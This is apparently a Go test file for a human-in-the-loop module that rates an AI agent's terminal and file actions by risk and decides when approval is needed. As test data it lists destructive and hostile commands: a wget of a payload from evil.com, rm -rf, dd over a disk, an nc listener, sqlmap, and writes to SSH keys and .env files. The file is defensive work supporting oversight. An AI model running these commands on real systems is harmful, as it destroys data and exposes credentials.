package hitl

import (
	"encoding/json"
	"testing"
)

func TestClassifyTerminalRisk(t *testing.T) {
	tests := []struct {
		name     string
		command  string
		detach   bool
		expected RiskClass
	}{
		{"read-only ls", "ls -la /tmp", false, RiskLow},
		{"read-only cat", "cat /etc/hostname", false, RiskLow},
		{"read-only whoami", "whoami", false, RiskLow},
		{"sudo command", "sudo apt install nmap", false, RiskHigh},
		{"rm -rf", "rm -rf /tmp/workdir", false, RiskHigh},
		{"rm -fr variant", "rm -fr /var/log", false, RiskHigh},
		{"curl outbound", "curl https://example.com", false, RiskMedium},
		{"wget download", "wget http://evil.com/payload.sh", false, RiskMedium},
		{"nmap scan", "nmap -sV 192.168.1.1", false, RiskMedium},
		{"sqlmap", "sqlmap -u http://target/page?id=1", false, RiskMedium},
		{"detached process", "python3 server.py", true, RiskMedium},
		{"simple echo", "echo hello", false, RiskLow},
		{"complex pipe", "grep -r pattern /home | wc -l", false, RiskLow},
		{"dd dangerous", "dd if=/dev/zero of=/dev/sda", false, RiskHigh},
		{"chmod 777", "chmod 777 /etc/passwd", false, RiskHigh},
		{"nc listener", "nc -lvp 4444", false, RiskMedium},
		{"ssh connection", "ssh root@target", false, RiskMedium},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, _ := json.Marshal(TerminalArgs{Input: tt.command, Detach: tt.detach})
			got := ClassifyRisk("terminal", args)
			if got != tt.expected {
				t.Errorf("ClassifyRisk(terminal, %q) = %s, want %s", tt.command, got, tt.expected)
			}
		})
	}
}

func TestClassifyFileRisk(t *testing.T) {
	tests := []struct {
		name     string
		filepath string
		action   string
		expected RiskClass
	}{
		{"read file", "/tmp/results.txt", "read_file", RiskLow},
		{"write tmp", "/tmp/output.txt", "update_file", RiskMedium},
		{"write etc", "/etc/passwd", "update_file", RiskHigh},
		{"write ssh key", "/root/.ssh/authorized_keys", "update_file", RiskHigh},
		{"write env", "/app/.env", "update_file", RiskHigh},
		{"read proc", "/proc/self/maps", "read_file", RiskLow},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, _ := json.Marshal(FileArgs{Path: tt.filepath, Action: tt.action})
			got := ClassifyRisk("file", args)
			if got != tt.expected {
				t.Errorf("ClassifyRisk(file, %+v) = %s, want %s", tt.name, got, tt.expected)
			}
		})
	}
}

func TestRequiresApproval(t *testing.T) {
	tests := []struct {
		name     string
		mode     Mode
		tools    []string
		toolName string
		risk     RiskClass
		expected bool
	}{
		{"policy_only never requires", ModePolicyOnly, nil, "terminal", RiskHigh, false},
		{"per_tool always requires", ModePerTool, nil, "terminal", RiskLow, true},
		{"risk_classified low skip", ModeRiskClassified, nil, "terminal", RiskLow, false},
		{"risk_classified medium needs", ModeRiskClassified, nil, "terminal", RiskMedium, true},
		{"risk_classified high needs", ModeRiskClassified, nil, "terminal", RiskHigh, true},
		{"risk_classified with tools list match", ModeRiskClassified, []string{"terminal"}, "terminal", RiskLow, true},
		{"risk_classified with tools list no match", ModeRiskClassified, []string{"terminal"}, "file", RiskHigh, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := Config{Mode: tt.mode, RiskTools: tt.tools}
			got := RequiresApproval(cfg, tt.toolName, tt.risk)
			if got != tt.expected {
				t.Errorf("RequiresApproval(%s, %s, %s) = %v, want %v", tt.mode, tt.toolName, tt.risk, got, tt.expected)
			}
		})
	}
}

func TestParseConfig(t *testing.T) {
	t.Run("empty returns default", func(t *testing.T) {
		cfg := ParseConfig(nil)
		if cfg.Mode != ModeRiskClassified {
			t.Errorf("expected default mode risk_classified, got %s", cfg.Mode)
		}
		if cfg.MaxDenials != 3 {
			t.Errorf("expected default max_denials 3, got %d", cfg.MaxDenials)
		}
	})

	t.Run("custom config", func(t *testing.T) {
		raw := json.RawMessage(`{"hitl":{"mode":"per_tool","approval_timeout_seconds":60,"allow_edit":true,"max_denials":5}}`)
		cfg := ParseConfig(raw)
		if cfg.Mode != ModePerTool {
			t.Errorf("expected per_tool, got %s", cfg.Mode)
		}
		if cfg.ApprovalTimeout != 60 {
			t.Errorf("expected timeout 60, got %d", cfg.ApprovalTimeout)
		}
		if cfg.MaxDenials != 5 {
			t.Errorf("expected max_denials 5, got %d", cfg.MaxDenials)
		}
	})

	t.Run("invalid JSON returns default", func(t *testing.T) {
		raw := json.RawMessage(`{invalid}`)
		cfg := ParseConfig(raw)
		if cfg.Mode != ModeRiskClassified {
			t.Errorf("expected default on invalid JSON, got %s", cfg.Mode)
		}
	})
}
